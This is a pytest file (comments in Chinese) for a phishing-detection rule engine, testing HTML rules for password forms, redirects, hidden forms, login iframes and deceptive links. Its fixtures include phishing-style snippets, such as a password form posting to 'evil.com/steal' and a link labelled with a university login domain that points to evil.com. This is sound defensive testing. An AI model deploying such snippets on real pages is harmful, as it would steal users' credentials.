"""测试 HTML、表单与导航规则."""
from phishing_rule_detector.rules.common import (
    RuleContext,
    extract_urls_from_text,
    extract_urls_from_html,
)
from phishing_rule_detector.rules.html_rules import (
    html_password_input,
    password_form_untrusted_target,
    form_collects_sensitive_info,
    form_collects_secret,
    meta_refresh_redirect,
    js_location_redirect,
    hidden_form_or_link,
    iframe_login_page,
    link_text_href_mismatch,
    external_link_dominance,
)


def _html_ctx(html: str, base_url: str | None = None, normalized: str | None = None) -> RuleContext:
    from phishing_rule_detector.normalizer import parse_html_dom
    soup, _ = parse_html_dom(html)
    urls = extract_urls_from_html(soup, base_url) if soup else []
    urls.extend(extract_urls_from_text(html, base_url))
    return RuleContext(
        input_text=html,
        normalized_text=normalized or html,
        input_type="html",
        base_url=base_url,
        raw_text=html,
        parsed_html=soup,
        extracted_urls=urls,
    )


class TestHtmlPasswordInput:
    def test_password_input_detected(self):
        ctx = _html_ctx("<form><input type='password' name='pwd'></form>")
        r = html_password_input(ctx)
        assert r is not None
        assert any(e.rule_id == "HTML_PASSWORD_INPUT" for e in r)

    def test_no_password_input(self):
        ctx = _html_ctx("<form><input type='text' name='user'></form>")
        r = html_password_input(ctx)
        assert r is None

    def test_html_entity_password_not_parsed_as_input(self):
        """&lt;input type=password&gt; 不能被解析为真实 DOM 节点."""
        html = "&lt;input type=&quot;password&quot;&gt;"
        from phishing_rule_detector.normalizer import parse_html_dom
        soup, _ = parse_html_dom(html)
        inputs = soup.find_all("input")
        assert len(inputs) == 0


class TestPasswordFormUntrustedTarget:
    def test_external_password_form_hits(self):
        """跨注册域提交：页面在 normal-site.com，表单提交到 evil.com."""
        ctx = _html_ctx(
            "<form action='https://evil.com/steal'><input type='password'></form>",
            base_url="https://normal-site.com/page",
        )
        r = password_form_untrusted_target(ctx)
        assert r is not None
        assert any(e.rule_id == "PASSWORD_FORM_UNTRUSTED_TARGET" for e in r)

    def test_official_domain_form_no_hit(self):
        ctx = _html_ctx(
            "<form action='https://pass.sdu.edu.cn/login'><input type='password'></form>"
        )
        r = password_form_untrusted_target(ctx)
        # 官方域名不命中
        if r:
            assert not any(e.rule_id == "PASSWORD_FORM_UNTRUSTED_TARGET" for e in r)

    def test_normal_external_login_form_no_hit(self):
        """正常外部网站登录表单（无品牌信号，页面与提交同域）不应命中."""
        ctx = _html_ctx(
            "<form action='https://normal-site.com/login'><input type='password'></form>",
            base_url="https://normal-site.com/page",
        )
        r = password_form_untrusted_target(ctx)
        # 同域提交不应触发
        assert r is None


class TestFormSensitiveInfo:
    def test_sensitive_fields_detected(self):
        ctx = _html_ctx(
            "<form><input name='student_id'><input name='phone'></form>"
        )
        r = form_collects_sensitive_info(ctx)
        assert r is not None
        assert any(e.rule_id == "FORM_COLLECTS_SENSITIVE_INFO" for e in r)


class TestFormSecret:
    def test_secret_fields_detected(self):
        ctx = _html_ctx(
            "<form><input name='password'><input name='bank_card'></form>"
        )
        r = form_collects_secret(ctx)
        assert r is not None
        assert any(e.rule_id == "FORM_COLLECTS_SECRET" for e in r)


class TestHtmlNavigation:
    def test_meta_refresh_detected(self):
        ctx = _html_ctx(
            '<meta http-equiv="refresh" content="0; url=https://evil.com">'
        )
        r = meta_refresh_redirect(ctx)
        assert r is not None

    def test_js_redirect_detected(self):
        ctx = _html_ctx(
            "<script>location.href='https://evil.com'</script>",
            normalized="<script>location.href='https://evil.com'</script>",
        )
        r = js_location_redirect(ctx)
        assert r is not None

    def test_hidden_form_detected(self):
        ctx = _html_ctx(
            '<form style="display:none"><input type="password"></form>'
        )
        r = hidden_form_or_link(ctx)
        assert r is not None

    def test_iframe_login_detected(self):
        ctx = _html_ctx(
            '<iframe src="https://evil.com/login"></iframe>'
        )
        r = iframe_login_page(ctx)
        assert r is not None


class TestLinkMismatch:
    def test_link_text_href_mismatch_hits(self):
        ctx = _html_ctx(
            '<a href="https://evil.com/login">pass.sdu.edu.cn</a>'
        )
        r = link_text_href_mismatch(ctx)
        assert r is not None
        assert any(e.rule_id == "LINK_TEXT_HREF_MISMATCH" for e in r)


class TestExternalLinkDominance:
    def test_high_external_ratio_hits(self):
        links = "".join(
            f'<a href="https://evil{i}.com">link{i}</a>' for i in range(10)
        )
        ctx = _html_ctx(links, base_url="https://example.com/home")
        r = external_link_dominance(ctx)
        # 检查是否有 evidence 并有 rule_id
        assert r is not None
